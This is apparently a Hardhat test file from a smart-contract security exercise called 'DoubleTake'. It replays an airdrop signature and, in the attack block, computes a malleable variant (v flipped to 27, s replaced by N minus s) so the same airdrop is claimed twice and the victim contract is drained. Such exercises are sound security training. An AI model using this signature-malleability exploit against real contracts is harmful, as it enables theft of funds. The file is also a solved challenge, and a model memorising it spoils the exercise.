const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = ethers;

const NAME = "DoubleTake";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value: ethers.utils.parseEther("2") });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));

            // claim your first Ether
            const v = 28;
            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
            const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

            await victimContract
                .connect(attackerWallet)
                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v, r, s);
        });

        it("conduct your attack here", async function () {
            // Curve order of secp256k1
            const N = BigNumber.from("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
            //Flip v (28 → 27)
            const v = 27;
            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
            const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";
            const sBN = BigNumber.from(s);
            //s' = N - s
            const sMalleable = N.sub(sBN);

            await victimContract
                .connect(attackerWallet)
                .claimAirdrop(
                    "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
                    ethers.utils.parseEther("1"),
                    v,
                    r,
                    sMalleable.toHexString()
                );
        });

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.equal(0, "victim contract is drained");
        });
    });
});
